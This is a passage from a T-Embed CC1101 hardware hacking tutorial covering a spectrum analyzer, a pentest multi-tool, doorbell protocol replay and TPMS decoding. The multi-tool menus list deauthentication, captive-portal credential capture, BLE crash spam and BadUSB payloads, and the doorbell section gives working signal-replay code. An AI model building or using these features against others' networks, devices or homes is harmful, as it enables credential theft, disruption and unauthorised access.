Create a real-time spectrum display on the T-Embed's TFT that shows signal activity across the full CC1101 frequency range. Build a color-coded waterfall display with peak hold, frequency logging, and battery-powered portable operation. You are essentially building a pocket spectrum analyzer.

### What You'll Learn

- Spectrum analysis principles and techniques
- RSSI (Received Signal Strength Indicator) measurement with the CC1101
- Real-time data visualization on embedded displays
- Sweep scanning across frequency ranges
- Waterfall display rendering
- Power management for portable operation

### Materials Needed

- T-Embed CC1101 Plus with antenna
- External battery (JST connector, 3.7V LiPo recommended)
- Arduino IDE or PlatformIO
- (Optional) RTL-SDR for comparison and verification

### Step-by-Step Instructions

**Step 1 --- Understand CC1101 RSSI**

The CC1101 provides an RSSI (Received Signal Strength Indicator) register that reports the power level of any signal at the currently tuned frequency. By rapidly sweeping across frequencies and reading RSSI at each step, you can build a spectrum display.

Key specifications:
- RSSI range: approximately -110 dBm to 0 dBm
- RSSI resolution: 0.5 dBm per step
- Frequency resolution: depends on sweep step size
- Sweep speed: limited by CC1101 settling time (~800 microseconds per frequency change)

**Step 2 --- Implement Frequency Sweep**

```c
#define FREQ_START  430000000  // 430 MHz
#define FREQ_END    440000000  // 440 MHz
#define FREQ_STEP     50000    // 50 kHz steps
#define NUM_STEPS   ((FREQ_END - FREQ_START) / FREQ_STEP)  // 200 steps

int8_t rssi_values[NUM_STEPS];

void sweepBand() {
    for (int i = 0; i < NUM_STEPS; i++) {
        uint32_t freq = FREQ_START + (i * FREQ_STEP);
        cc1101_setFrequency(freq);
        delayMicroseconds(800);  // Wait for PLL to settle
        rssi_values[i] = cc1101_readRSSI();
    }
}
```

**Step 3 --- Build the Spectrum Display**

Map RSSI values to colors and pixel heights on the 170x320 TFT:

```c
// Color mapping for signal strength
// -110 dBm (noise floor) → dark blue
// -90 dBm (weak signal) → green
// -70 dBm (medium signal) → yellow
// -50 dBm (strong signal) → red

uint16_t rssiToColor(int8_t rssi) {
    if (rssi < -90) return TFT_NAVY;
    if (rssi < -80) return TFT_BLUE;
    if (rssi < -70) return TFT_GREEN;
    if (rssi < -60) return TFT_YELLOW;
    if (rssi < -50) return TFT_ORANGE;
    return TFT_RED;
}

void drawSpectrum() {
    int bar_width = 320 / NUM_STEPS;  // Width of each frequency bin
    for (int i = 0; i < NUM_STEPS; i++) {
        int height = map(rssi_values[i], -110, 0, 0, 150);
        int x = i * bar_width;
        uint16_t color = rssiToColor(rssi_values[i]);

        tft.fillRect(x, 170 - height, bar_width, height, color);
        tft.fillRect(x, 0, bar_width, 170 - height, TFT_BLACK);
    }
}
```

**Step 4 --- Add Waterfall Display**

A waterfall display scrolls historical spectrum data downward, showing signal activity over time:

```c
// Waterfall buffer: each row is one sweep
#define WATERFALL_HEIGHT 80
uint16_t waterfall[WATERFALL_HEIGHT][NUM_STEPS];

void updateWaterfall() {
    // Shift all rows down by one
    memmove(&waterfall[1], &waterfall[0],
            sizeof(uint16_t) * NUM_STEPS * (WATERFALL_HEIGHT - 1));

    // New sweep data becomes top row
    for (int i = 0; i < NUM_STEPS; i++) {
        waterfall[0][i] = rssiToColor(rssi_values[i]);
    }

    // Draw waterfall section below spectrum
    for (int y = 0; y < WATERFALL_HEIGHT; y++) {
        for (int x = 0; x < NUM_STEPS; x++) {
            tft.drawPixel(x * bar_width, 170 + y, waterfall[y][x]);
        }
    }
}
```

**Step 5 --- Add Peak Hold**

Peak hold shows the maximum signal level seen at each frequency:

```c
int8_t peak_rssi[NUM_STEPS];
uint32_t peak_time[NUM_STEPS];

void updatePeakHold() {
    uint32_t now = millis();
    for (int i = 0; i < NUM_STEPS; i++) {
        if (rssi_values[i] > peak_rssi[i]) {
            peak_rssi[i] = rssi_values[i];
            peak_time[i] = now;
        }
        // Decay peak after 3 seconds
        if (now - peak_time[i] > 3000) {
            peak_rssi[i] = rssi_values[i];
        }
    }
}

// Draw peak markers as white dots above the spectrum bars
void drawPeakMarkers() {
    for (int i = 0; i < NUM_STEPS; i++) {
        int peak_y = map(peak_rssi[i], -110, 0, 170, 20);
        tft.drawPixel(i * bar_width + bar_width/2, peak_y, TFT_WHITE);
    }
}
```

**Step 6 --- Add Navigation Controls**

Use the rotary encoder to:

- **Rotate**: Scroll center frequency left/right
- **Press**: Cycle between band presets (300--348, 387--464, 779--928 MHz)
- **Long press**: Toggle between spectrum view and waterfall view

Add an on-screen display showing:

```
┌──────────────────────────────────────────┐
│  430.0 MHz ────────────── 440.0 MHz      │
│  ▁▂▃▅▇█▇▅▃▂▁▁▁▂▅▇▅▃▁▁▁▁▁▂▃▂▁▁▁▁▁▁▁▁   │ ← Spectrum
│  · · · · ·   · · ·                 ·     │ ← Peak hold
│──────────────────────────────────────────│
│ ░░▓▓░░░░░▒▒▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░  │
│ ░░░▒▒░░░░░▒▒▓▓▒▒░░░░░░░░░░░░░░░░░░░░░  │ ← Waterfall
│ ░░░░░░░░░░░▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░  │
│──────────────────────────────────────────│
│ Center: 435.0 MHz  Span: 10 MHz  -72dBm │
└──────────────────────────────────────────┘
```

### Expected Results

- The spectrum display will update at approximately 2--5 sweeps per second (depending on step count and settling time)
- Strong nearby signals (weather stations, doorbells) will appear as distinct peaks rising above the noise floor
- The noise floor will typically sit around -100 to -95 dBm
- The waterfall display will show intermittent transmissions as horizontal streaks
- Battery life with continuous scanning will be approximately 2--4 hours with a 1000 mAh LiPo

### Extensions

- Add dBm scale markers and frequency labels to the display
- Implement zoom (narrow the frequency span for finer resolution)
- Add signal triggering (capture when a signal exceeds a threshold)
- Log frequency/time/RSSI data to a file for post-analysis
- Build a "signal hunter" mode that auto-tunes to the strongest detected signal
- Compare your results with an RTL-SDR + SDR# waterfall for verification

---

## Project 10: Integrated Pentest Multi-Tool
{: .d-inline-block }

Expert
{: .label .label-purple }

### Overview

Combine every capability of the T-Embed --- Sub-GHz, WiFi, BLE, IR, and BadUSB --- into a cohesive, menu-driven penetration testing toolkit with a polished interface, organized logging, and professional output. You are building your own Flipper Zero from scratch, customized exactly to your needs.

### What You'll Learn

- System architecture for multi-function embedded tools
- Menu system design and user interface development on embedded displays
- Integrating multiple radio systems into one workflow
- Data logging and report generation on embedded systems
- Professional penetration testing workflow
- Full-stack embedded development

### Materials Needed

- T-Embed CC1101 Plus with antenna
- External battery (1000+ mAh LiPo recommended)
- MicroSD card module (connected via SPI/GPIO) for logging
- Arduino IDE or PlatformIO with all required libraries
- Computer for firmware development

{: .note }
> This is a significant firmware development project. Expect 40--80 hours of development time to build a polished, fully-featured tool. You can start with a subset of features and add modules incrementally.

### Step-by-Step Instructions

**Step 1 --- Architecture Design**

Design a modular architecture where each capability is an independent module:

```
┌──────────────────────────────────────────┐
│                 Main Menu                 │
├──────────┬──────────┬──────────┬─────────┤
│ RF Recon │ WiFi     │ BLE      │ IR      │
│ Module   │ Module   │ Module   │ Module  │
├──────────┼──────────┼──────────┼─────────┤
│ BadUSB   │ Spectrum │ Settings │ Logs    │
│ Module   │ Analyzer │          │         │
└──────────┴──────────┴──────────┴─────────┘
        │           │           │
   ┌────▼───────────▼───────────▼────┐
   │        Shared Services           │
   │  • Display Manager               │
   │  • Input Handler (encoder)        │
   │  • File System (SD logging)       │
   │  • Battery Monitor                │
   │  • Configuration Store            │
   └──────────────────────────────────┘
```

**Step 2 --- Build the Menu System**

Create a reusable menu engine driven by the rotary encoder:

```c
typedef struct {
    const char* label;
    void (*action)(void);
    const uint16_t* icon;  // 16x16 bitmap icon
} MenuItem;

typedef struct {
    const char* title;
    MenuItem* items;
    uint8_t item_count;
    uint8_t selected;
    uint8_t scroll_offset;
} Menu;

// Main menu definition
MenuItem main_items[] = {
    {"RF Recon",      rfReconMode,     icon_rf},
    {"WiFi Audit",    wifiAuditMode,   icon_wifi},
    {"BLE Scanner",   bleScanMode,     icon_ble},
    {"IR Remote",     irRemoteMode,    icon_ir},
    {"BadUSB",        badusbMode,      icon_usb},
    {"Spectrum",      spectrumMode,    icon_spectrum},
    {"Settings",      settingsMode,    icon_settings},
    {"View Logs",     viewLogsMode,    icon_logs},
};
```

**Step 3 --- Implement the RF Recon Module**

Combine all Sub-GHz capabilities:

```
RF Recon Menu:
├── Frequency Analyzer
│   └── Sweep all bands, show active frequencies
├── Signal Capture
│   ├── Auto-detect frequency and modulation
│   ├── Manual frequency entry
│   └── Save to SD card
├── Signal Replay
│   ├── Load from SD card
│   ├── Recent captures
│   └── Replay with options (repeat count, delay)
├── Protocol Decoder
│   ├── Known protocols (weather, remotes, sensors)
│   └── Raw bit display
└── Continuous Monitor
    └── Log all activity on a frequency
```

**Step 4 --- Implement the WiFi Audit Module**

```
WiFi Audit Menu:
├── Network Scanner
│   ├── Full scan (all channels)
│   ├── Targeted scan (specific SSID)
│   └── Export results
├── Deauth Tester
│   ├── Target selection
│   ├── Single deauth
│   └── PMF detection
├── Beacon Generator
│   ├── Custom SSID list
│   ├── Rickroll / funny SSIDs
│   └── Clone existing networks
├── Evil Portal
│   ├── Captive portal templates
│   ├── Credential capture
│   └── Custom HTML upload
└── Packet Monitor
    └── Channel activity display
```

**Step 5 --- Implement the BLE Module**

```
BLE Menu:
├── Device Scanner
│   ├── Passive scan
│   ├── Active scan (more data, less stealthy)
│   └── Device count mode
├── GATT Explorer
│   ├── Connect to device
│   ├── Enumerate services
│   └── Read characteristics
├── Advertisement Spam
│   ├── Apple notification spam
│   ├── Samsung/Android spam
│   ├── Custom advertisements
│   └── Sour Apple (crash notifications)
└── BLE Tracker
    └── Monitor specific device RSSI
```

**Step 6 --- Implement the IR Module**

```
IR Menu:
├── Capture
│   ├── Auto-decode (NEC, Sony, RC5, RC6, Samsung)
│   ├── Raw capture
│   └── Save to library
├── Replay
│   ├── From library
│   ├── Recent captures
│   └── Repeat mode
├── TV-B-Gone
│   ├── All codes
│   └── Region selection
└── Custom Remote
    ├── Load device profile
    └── Button layout editor
```

**Step 7 --- Implement the BadUSB Module**

```
BadUSB Menu:
├── Payload Browser
│   ├── SD card payloads
│   ├── Built-in payloads
│   └── Recent payloads
├── Payload Editor
│   ├── On-device text editor
│   └── Template selection
├── Execute
│   ├── Run selected payload
│   ├── Delayed execution
│   └── OS auto-detect
└── Keyboard Tester
    └── Type test strings
```

**Step 8 --- Build the Logging System**

All modules log to a structured format on the SD card:

```
/logs/
├── 2026-02-28/
│   ├── rf_scan_14-30-00.json
│   ├── wifi_audit_14-45-00.json
│   ├── ble_scan_15-00-00.json
│   └── session_summary.json
```

Log format:

```json
{
    "timestamp": "2026-02-28T14:30:00",
    "module": "rf_recon",
    "action": "signal_capture",
    "frequency": 433920000,
    "modulation": "OOK",
    "rssi": -65,
    "data": "AA BB CC DD EE FF",
    "notes": "Doorbell signal - fixed code"
}
```

**Step 9 --- Add the Settings Module**

```
Settings Menu:
├── Display
│   ├── Brightness
│   ├── Screen timeout
│   └── Color theme
├── Radio
│   ├── Default frequency
│   ├── TX power level
│   └── Region (affects legal frequencies)
├── Storage
│   ├── SD card info
│   ├── Clear logs
│   └── Export all data
├── Battery
│   ├── Voltage display
│   ├── Low battery threshold
│   └── Power saving mode
└── About
    ├── Firmware version
    ├── Hardware info
    └── Legal notice
```

**Step 10 --- Polish the User Interface**

Design a professional status bar and consistent visual language:

```
┌──────────────────────────────────────────┐
│ 🔋 87%  📡 433.9MHz   📶 WiFi   14:30  │ ← Status bar
│──────────────────────────────────────────│
│                                          │
│    ┌────────────────────────────────┐    │
│    │  ► RF Recon                    │    │
│    │    WiFi Audit                  │    │
│    │    BLE Scanner                 │    │
│    │    IR Remote                   │    │ ← Menu items
│    │    BadUSB                      │    │
│    │    Spectrum                    │    │
│    └────────────────────────────────┘    │
│                                          │
│──────────────────────────────────────────│
│ [ROTATE] Navigate    [PRESS] Select     │ ← Control hints
└──────────────────────────────────────────┘
```

### Expected Results

- A fully functional multi-tool that boots to your custom menu system
- Smooth navigation with the rotary encoder (no lag, no missed inputs)
- Each module works independently without interfering with others
- All actions are logged to the SD card automatically
- Battery life of 3--6 hours depending on active radio usage
- A tool that is genuinely useful for authorized penetration testing

{: .tip }
> Start with the menu system and one module (RF Recon is recommended). Get that working perfectly before adding more modules. A well-built single module is more useful than five half-finished ones.

### Extensions

- Add OTA firmware update capability so you can update without USB
- Build a companion web app that parses and visualizes log data
- Add a "quick actions" mode triggered by specific encoder gestures (double-click, long press patterns)
- Implement a scripting engine for automated test sequences
- Add WiFi-based remote control from a phone/laptop
- Share your firmware on GitHub for the community to use and improve
- Create 3D-printable cases with labeled controls and antenna routing

---

## Project 11: Wireless Doorbell Protocol Reverse Engineering
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

That wireless doorbell sitting by your front door is a miniature radio transmitter hiding a surprisingly elegant protocol under the hood. Every time someone presses the button, it fires off a burst of RF energy carrying a carefully structured digital message --- an address, a command, and sometimes error-checking bits. This project teaches you to intercept that signal, tear it apart bit by bit, and fully document the protocol.

Most wireless doorbells operating on 315 MHz or 433.92 MHz use OOK (On-Off Keying) modulation with either the PT2262 or EV1527 encoder chip. These chips have been in production since the 1990s and their protocols are well-understood, making them an ideal target for learning RF reverse engineering. You will capture the raw signal, analyze the timing, decode the address and data bits, and then build a custom transmitter that can ring your own doorbell on command.

This is a foundational reverse engineering exercise. The methodology you learn here --- capture, analyze timing, identify encoding, decode bits, verify by retransmission --- applies to virtually every simple OOK device you will ever encounter.

### What You'll Learn

- OOK/ASK signal capture and analysis
- PT2262 and EV1527 protocol structure and timing
- Bit-level decoding of address and data fields
- Timing diagram analysis and measurement
- Signal reconstruction and retransmission
- Systematic protocol documentation methodology

### Materials Needed

- T-Embed CC1101 Plus with antenna
- A wireless doorbell that you own (most 433 MHz models work)
- Computer with [URH](https://github.com/jopohl/urh) or [PulseView](https://sigrok.org/wiki/PulseView) installed
- Notebook for timing measurements and bit mapping
- (Optional) Oscilloscope or logic analyzer for timing verification

{: .danger }
> **This project must be performed on a doorbell you own, installed at your own property.** Capturing or replaying signals from a neighbor's doorbell is illegal. Purchase an inexpensive 433 MHz wireless doorbell kit if you do not already own one --- they cost $10--20 and are perfect for this exercise.

### Step-by-Step Instructions

**Step 1 --- Identify Your Doorbell's Frequency and Modulation**

Before diving into protocol analysis, confirm the operating parameters. Most wireless doorbells use one of two frequencies:

| Region | Common Frequency | ISM Band |
|:-------|:-----------------|:---------|
| North America | 315 MHz | Part 15 |
| Europe / Asia / Global | 433.92 MHz | ISM |

Open the frequency analyzer and press your doorbell button:

```
Main Menu → RF → Frequency Analyzer
```

Note the exact frequency. Then switch to Sub-GHz capture:

```
Main Menu → RF → Sub-GHz → Read
Frequency: [detected frequency]
Modulation: AM (OOK)
```

Press the doorbell button 5 times, capturing each transmission separately. Save each capture with a sequential name: `doorbell_cap_1` through `doorbell_cap_5`.

**Step 2 --- Analyze the Raw Signal Timing**

Transfer your captures to a computer and open them in URH. Zoom into a single transmission. You will see a pattern of short and long pulses separated by gaps. A typical PT2262 signal looks like this:

```
Sync pulse (long low):  ________________________________
                       |                                |
Short high:   __|      |                                |
Long high:    ____|    |                                |

Data pattern:
  ┌─┐   ┌─┐         ┌───┐ ┌─┐         ┌───┐ ┌───┐
  │ │   │ │         │   │ │ │         │   │ │   │
──┘ └───┘ └─────────┘   └─┘ └─────────┘   └─┘   └──
  "0"       "0"          "1"   "0"          "1"   "1"
```

Measure these critical timing parameters:

| Parameter | PT2262 Typical | EV1527 Typical |
|:----------|:---------------|:---------------|
| Short pulse | 350 us | 320 us |
| Long pulse | 1050 us (3x short) | 960 us (3x short) |
| Sync low duration | 10850 us (31x short) | 9920 us (31x short) |
| Total bit period | 1400 us | 1280 us |
| Bits per frame | 24 (12 trits) | 24 bits |

{: .tip }
> The ratio between short and long pulses is the key identifier. PT2262 uses a strict 1:3 ratio. If your long pulses are exactly three times the width of your short pulses, you almost certainly have a PT2262-based system.

**Step 3 --- Decode the Bit Encoding**

PT2262 uses a **tri-state** encoding system where each "bit position" is actually a pair of pulses representing one of three states:

```
Encoding scheme (PT2262):
  "0" = Short-High, Long-Low, Short-High, Long-Low
  "1" = Long-High, Short-Low, Long-High, Short-Low
  "F" = Short-High, Long-Low, Long-High, Short-Low  (floating)

Encoding scheme (EV1527):
  "0" = Short-High, Long-Low
  "1" = Long-High, Short-Low
```

For a PT2262, the 24-bit transmission encodes 12 tri-state positions:

```
┌─────────────────────────────┬────────────┐
│      Address (8 trits)      │ Data (4 t) │
│  A0  A1  A2  A3  A4  A5  A6  A7 │ D0 D1 D2 D3 │
└─────────────────────────────┴────────────┘
```

For an EV1527, the 24 bits split differently:

```
┌──────────────────────┬──────┐
│   Address (20 bits)  │ Data │
│   Fixed at factory   │(4 b) │
└──────────────────────┴──────┘
```

**Step 4 --- Map Your Doorbell's Specific Code**

Using your timing analysis, decode each capture into its bit representation. Compare all 5 captures:

```
Capture 1: 0F0F0F0F 0101  → Address: 0F0F0F0F, Data: 0101
Capture 2: 0F0F0F0F 0101  → Address: 0F0F0F0F, Data: 0101
Capture 3: 0F0F0F0F 0101  → Address: 0F0F0F0F, Data: 0101
Capture 4: 0F0F0F0F 0101  → Address: 0F0F0F0F, Data: 0101
Capture 5: 0F0F0F0F 0101  → Address: 0F0F0F0F, Data: 0101
```

If all 5 are identical, you have confirmed a fixed-code system. Document the complete protocol specification:

```
═══════════════════════════════════════
   Doorbell Protocol Specification
═══════════════════════════════════════
Frequency:     433.92 MHz
Modulation:    OOK/ASK
Encoder chip:  PT2262 (or EV1527)
Short pulse:   350 μs
Long pulse:    1050 μs
Sync pulse:    10850 μs
Bit period:    1400 μs
Frame length:  24 bits (12 trits)
Repetitions:   4 per button press
Address:       0F0F0F0F (8 trits)
Data:          0101 (4 trits)
```

**Step 5 --- Build a Custom Transmitter**

Now that you fully understand the protocol, replay your captured signal to verify your analysis:

```
Main Menu → RF → Sub-GHz → Saved → doorbell_cap_1 → Send
```

If the doorbell receiver rings, your decode is correct. For a deeper understanding, you can construct the signal programmatically:

```c
// PT2262 doorbell transmitter
#define SHORT_PULSE  350   // microseconds
#define LONG_PULSE   1050  // microseconds
#define SYNC_LOW     10850 // microseconds
#define TX_PIN       CC1101_GDO0

// Send a tri-state "0": short-high, long-low, short-high, long-low
void sendTrit0() {
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(SHORT_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(LONG_PULSE);
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(SHORT_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(LONG_PULSE);
}

// Send a tri-state "1": long-high, short-low, long-high, short-low
void sendTrit1() {
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(LONG_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(SHORT_PULSE);
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(LONG_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(SHORT_PULSE);
}

// Send a tri-state "F": short-high, long-low, long-high, short-low
void sendTritF() {
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(SHORT_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(LONG_PULSE);
    digitalWrite(TX_PIN, HIGH); delayMicroseconds(LONG_PULSE);
    digitalWrite(TX_PIN, LOW);  delayMicroseconds(SHORT_PULSE);
}

void sendDoorbellCode() {
    // Send 4 repetitions (standard for PT2262)
    for (int rep = 0; rep < 4; rep++) {
        // Address trits: 0F0F0F0F
        sendTrit0(); sendTritF(); sendTrit0(); sendTritF();
        sendTrit0(); sendTritF(); sendTrit0(); sendTritF();
        // Data trits: 0101
        sendTrit0(); sendTrit1(); sendTrit0(); sendTrit1();
        // Sync: short high then long low
        digitalWrite(TX_PIN, HIGH); delayMicroseconds(SHORT_PULSE);
        digitalWrite(TX_PIN, LOW);  delayMicroseconds(SYNC_LOW);
    }
}
```

**Step 6 --- Document the Full Protocol**

Create a complete timing diagram showing one full frame:

```
One complete PT2262 frame (not to scale):

│←──────── Address (8 trits) ────────→│←─ Data (4) ─→│← Sync →│

 A0   A1   A2   A3   A4   A5   A6   A7  D0   D1   D2   D3   Sync
┌┐  ┌──┐ ┌┐  ┌──┐ ┌┐  ┌──┐ ┌┐  ┌──┐ ┌┐  ┌──┐ ┌┐  ┌──┐ ┌┐
│ │  │  │ │ │  │  │ │ │  │  │ │ │  │  │ │ │  │  │ │ │  │  │ │ │
┘ └──┘  └─┘ └──┘  └─┘ └──┘  └─┘ └──┘  └─┘ └──┘  └─┘ └──┘  └─┘ └─────
"0"  "F"  "0"  "F"  "0"  "F"  "0"  "F"  "0"  "1"  "0"  "1"

Total frame duration: ~33.6 ms (24 bit periods × 1400 μs)
Inter-frame gap (sync): 10850 μs
Complete transmission (4 frames): ~178 ms
```

### Expected Results

- All 5 captures will produce identical bit sequences, confirming fixed-code operation
- The timing measurements will closely match published PT2262 or EV1527 specifications
- Your reconstructed transmission will successfully ring the doorbell receiver
- You will be able to identify the exact address programmed into the transmitter (often set by DIP switches or factory-burned into the EV1527)
- The complete protocol document will serve as a template for analyzing any OOK device

{: .tip }
> If your doorbell has DIP switches inside the transmitter, open it up and compare the switch positions to your decoded address bits. They should match exactly --- this is the most satisfying verification that your decode is correct.

### Extensions

- Analyze a second doorbell brand and compare the protocol differences
- Build a doorbell "sniffer" that continuously monitors 433 MHz and logs every doorbell press in your neighborhood (receive only --- this is passive monitoring)
- Write a Python script using the rtl_433 JSON output to automatically decode doorbell signals
- Experiment with different data nibbles to discover if your receiver responds to alternate tones or functions
- Investigate the effective transmission range by testing at increasing distances from the receiver

---

## Project 12: Tire Pressure Monitoring System (TPMS) Receiver
{: .d-inline-block }

Intermediate
{: .label .label-yellow }

### Overview

Every modern vehicle sold in the United States since 2007 (and in the EU since 2014) is equipped with a Tire Pressure Monitoring System. Each wheel has a small sensor bolted to the valve stem or banded to the rim that periodically broadcasts tire pressure, temperature, and a unique sensor ID over RF. These transmissions are completely unencrypted and unidirectional --- the sensor transmits, and the car's receiver listens. That means anyone with the right receiver can listen too.

In this project, you will build a passive TPMS receiver for your own vehicle using the T-Embed CC1101 Plus. You will identify your tire sensors' unique IDs, decode the pressure and temperature data, display real-time tire information on the TFT screen, and log pressure changes over time. This is strictly a receive-only project --- you never transmit anything, and there is no legal issue with receiving RF signals from your own vehicle.

TPMS is an excellent protocol analysis target because the data is directly verifiable. You can compare your decoded pressure values against the readings on your car's dashboard, giving you immediate confirmation that your analysis is correct.

### What You'll Learn

- FSK (Frequency Shift Keying) demodulation principles
- TPMS protocol structures (Manchester encoding, sensor ID, pressure/temperature fields)
- How to identify specific encoding schemes from raw signal data
- Real-time data decoding and display on embedded hardware
- Data logging and trend analysis for sensor data
- Passive RF reception techniques

### Materials Needed

- T-Embed CC1101 Plus with antenna
- Your personal vehicle (parked nearby for testing)
- Tire pressure gauge (for verification against decoded values)
- Computer with URH for signal analysis
- (Optional) RTL-SDR dongle running `rtl_433` for cross-reference
- (Optional) External battery for extended monitoring sessions

{: .note }
> **Legal note**: TPMS reception is entirely passive. You are only listening to signals your own vehicle is broadcasting. This is analogous to using a radio receiver --- no laws prohibit receiving unencrypted RF transmissions in the ISM band. You never need to transmit anything for this project.

### Step-by-Step Instructions

**Step 1 --- Determine Your TPMS Frequency**

TPMS sensors transmit on one of two frequencies depending on your region:

| Region | Frequency | Modulation | Common Protocols |
|:-------|:----------|:-----------|:-----------------|
| United States | 315 MHz | FSK / OOK | Schrader, GE, Pacific |
| Europe / Asia | 433.92 MHz | FSK / OOK | Continental, TRW, Huf |

Start the frequency analyzer and park near your vehicle. TPMS sensors transmit periodically (every 60--90 seconds while driving, less frequently when parked) and immediately after detecting a pressure change:

```
Main Menu → RF → Frequency Analyzer
```

Watch for brief signal bursts around 315 MHz or 433.92 MHz. To force a transmission while parked, briefly deflate and reinflate one tire using the valve stem --- the pressure change will trigger an immediate broadcast.

**Step 2 --- Capture Raw TPMS Signals**

Configure Sub-GHz capture for your identified frequency. TPMS typically uses FSK modulation, but some older sensors use OOK:

```
Main Menu → RF → Sub-GHz → Read
Frequency: 315.00 MHz (US) or 433.92 MHz (EU)
Modulation: FM (FSK) — try AM (OOK) if FSK yields nothing
```

Capture at least 10 separate transmissions. TPMS sensors transmit independently, so you will receive signals from all four tires (and potentially from nearby vehicles --- ignore those for now).

{: .tip }
> Drive your car slowly in a circle in an empty parking lot while capturing. The movement will trigger all four sensors to transmit more frequently, and you can capture all four sensor IDs in a few minutes.

**Step 3 --- Identify the Protocol Structure**

Transfer captures to URH and analyze the bit patterns. Most TPMS protocols follow a similar general structure:

```
┌──────────┬──────────┬────────────┬──────────┬──────────┬──────────┬─────────┐
│ Preamble │ Sync     │ Sensor ID  │ Pressure │ Temp     │ Flags    │ CRC     │
│ 4-8 bits │ 8-16 b   │ 24-32 bits │ 8 bits   │ 8 bits   │ 4-8 bits │ 8 bits  │
└──────────┴──────────┴────────────┴──────────┴──────────┴──────────┴─────────┘
```

Common TPMS encoding details by manufacturer:

| Manufacturer | ID Length | Pressure Encoding | Temp Encoding |
|:-------------|:----------|:------------------|:--------------|
| Schrader (GE) | 28 bits | (raw × 2.5) kPa | (raw - 50) degrees C |
| TRW | 28 bits | (raw × 1.38) kPa | (raw - 40) degrees C |
| Continental | 32 bits | (raw × 2.5) kPa | (raw - 50) degrees C |
| Pacific (PMV) | 32 bits | (raw / 4) psi | (raw - 40) degrees C |

**Step 4 --- Isolate Your Vehicle's Sensor IDs**

Compare your 10+ captures to identify the 4 unique sensor IDs belonging to your vehicle. Group captures by sensor ID:

```
═══════════════════════════════════════
     TPMS Sensor Identification
     Vehicle: [Your Car Make/Model]
═══════════════════════════════════════

Sensor ID: 0x3A7F12B  → Tire position TBD
  Capture 1: Pressure=32.5 psi, Temp=28°C
  Capture 2: Pressure=32.5 psi, Temp=29°C

Sensor ID: 0x3A7F13C  → Tire position TBD
  Capture 3: Pressure=33.0 psi, Temp=27°C

Sensor ID: 0x3A7F14D  → Tire position TBD
  Capture 4: Pressure=32.0 psi, Temp=28°C

Sensor ID: 0x3A7F15E  → Tire position TBD
  Capture 5: Pressure=31.5 psi, Temp=29°C
```

To identify which sensor is on which tire, deliberately deflate one tire slightly (2--3 psi) and observe which sensor ID reports the pressure drop. Repeat for each position.

**Step 5 --- Build the Real-Time Display**

Write firmware to continuously monitor, decode, and display TPMS data on the TFT:

```c
#include <TFT_eSPI.h>
#include "cc1101_driver.h"

// TPMS sensor database for your vehicle
typedef struct {
    uint32_t sensor_id;
    const char* position;   // "FL", "FR", "RL", "RR"
    float pressure_psi;
    float temperature_c;
    uint32_t last_seen;     // millis() timestamp
} TPMSSensor;

TPMSSensor my_sensors[4] = {
    {0x3A7F12B, "FL", 0, 0, 0},
    {0x3A7F13C, "FR", 0, 0, 0},
    {0x3A7F14D, "RL", 0, 0, 0},
    {0x3A7F15E, "RR", 0, 0, 0},
};

void decodeTPMS(uint8_t* raw_data, uint8_t len) {
    // Extract sensor ID (example for Schrader protocol)
    uint32_t id = (raw_data[0] << 20) | (raw_data[1] << 12) |
                  (raw_data[2] << 4)  | (raw_data[3] >> 4);

    // Decode pressure: raw value × 2.5 kPa, convert to psi
    float pressure_kpa = raw_data[4] * 2.5;
    float pressure_psi = pressure_kpa * 0.14503773;

    // Decode temperature: raw value - 50 = degrees Celsius
    float temp_c = (float)raw_data[5] - 50.0;

    // Update matching sensor
    for (int i = 0; i < 4; i++) {
        if (my_sensors[i].sensor_id == id) {
            my_sensors[i].pressure_psi = pressure_psi;
            my_sensors[i].temperature_c = temp_c;
            my_sensors[i].last_seen = millis();
            break;
        }
    }
}
```

Design a dashboard layout:

```
┌──────────────────────────────────┐
│       TPMS Monitor v1.0         │
│                                  │
│   ┌───────┐       ┌───────┐     │
│   │  FL   │       │  FR   │     │
│   │ 32.5  │       │ 33.0  │     │
│   │  psi  │       │  psi  │     │
│   │ 28°C  │       │ 27°C  │     │
│   └───────┘       └───────┘     │
│                                  │
│   ┌───────┐       ┌───────┐     │
│   │  RL   │       │  RR   │     │
│   │ 32.0  │       │ 31.5  │     │
│   │  psi  │       │  psi  │     │
│   │ 28°C  │       │ 29°C  │     │
│   └───────┘       └───────┘     │
│                                  │
│  Last update: 45s ago   OK      │
└──────────────────────────────────┘
```

**Step 6 --- Add Pressure Alerts and Data Logging**

Implement threshold-based alerts and log pressure history:

```c
#define PRESSURE_LOW_WARN   28.0  // psi - warn below this
#define PRESSURE_LOW_CRIT   25.0  // psi - critical below this
#define PRESSURE_HIGH_WARN  38.0  // psi - warn above this
#define TEMP_HIGH_WARN      80.0  // °C - warn above this

void checkAlerts(TPMSSensor* sensor) {
    if (sensor->pressure_psi < PRESSURE_LOW_CRIT) {
        drawAlert(sensor->position, "CRITICAL LOW", TFT_RED);
        playAlarmTone();  // Use T-Embed speaker
    } else if (sensor->pressure_psi < PRESSURE_LOW_WARN) {
        drawAlert(sensor->position, "LOW", TFT_YELLOW);
    } else if (sensor->pressure_psi > PRESSURE_HIGH_WARN) {
        drawAlert(sensor->position, "HIGH", TFT_ORANGE);
    }
}

// Log to SPIFFS every 5 minutes
void logPressureData() {
    File f = SPIFFS.open("/tpms_log.csv", FILE_APPEND);
    for (int i = 0; i < 4; i++) {
        f.printf("%lu,%s,%.1f,%.1f\n",
            millis(), my_sensors[i].position,
            my_sensors[i].pressure_psi,
            my_sensors[i].temperature_c);
    }
    f.close();
}
```

### Expected Results

- You will identify all 4 tire sensor IDs within 10--15 minutes of driving
- Decoded pressure values will match your dashboard display within 0.5--1.0 psi
- Temperature readings will be reasonable for ambient conditions (slightly higher than air temperature due to road friction and braking)
